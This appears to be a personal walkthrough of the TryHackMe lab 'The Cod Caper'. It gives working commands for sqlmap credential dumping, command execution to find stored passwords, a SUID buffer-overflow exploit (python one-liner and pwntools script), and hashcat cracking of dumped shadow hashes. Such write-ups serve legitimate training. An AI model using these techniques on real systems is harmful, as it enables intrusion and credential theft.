# Matheus Jesus 12-04-2020

## Try Hack Me - [The Cod Caper](https://tryhackme.com/room/thecodcaper)

### IP 10.10.109.156

#### Recon

nmap -sC -sV -oN nmap_initial 10.10.109.156

SSH and WebServer found
port 22 port 80

#### Web Enumeration

```sh
gobuster dir -u http://10.10.109.156:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
```

Found route
/administrator.php (Status: 200)

#### SQLMap for trying to find the administrator user / hash

sqlmap -u 10.10.109.156/administrator.php --forms

database is a MySQL.

sqlmap -u 10.10.109.156/administrator.php --dump --forms

copied user.csv file to local.

found user pingudad:secretpass

#### Access administrator

It is possible to run commands now

cat /etc/passwd to see if pingu user still exists

find / -user pingu to see everything owned by pingu

found id_rsa -> /home/pingu/.ssh/id_rsa
USELESS!!!!!!

find / -name pass

found /var/hidden/pass
pingu:pinguapingu

#### Remote Acess

ssh pingu@10.10.109.56

scp /opt/linEnum/linEnum.sh pingu@10.10.109.56:/dev/shm
chmod +x linEnum.sh
./linEnum.sh

#### SUID

/opt/secret/root

##### Manually

gdb /opt/secret/root
disassemble shell

shell memory address 0x080484cb

invert bytes to little indian -> call root.
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root

##### Scripting

```python
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()
```

in both ways we get papa's hash

papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::

hashcat -m 1800 -a 0 -o found1.txt  $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck /usr/share/wordlists/rockyou.txt --force

$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish
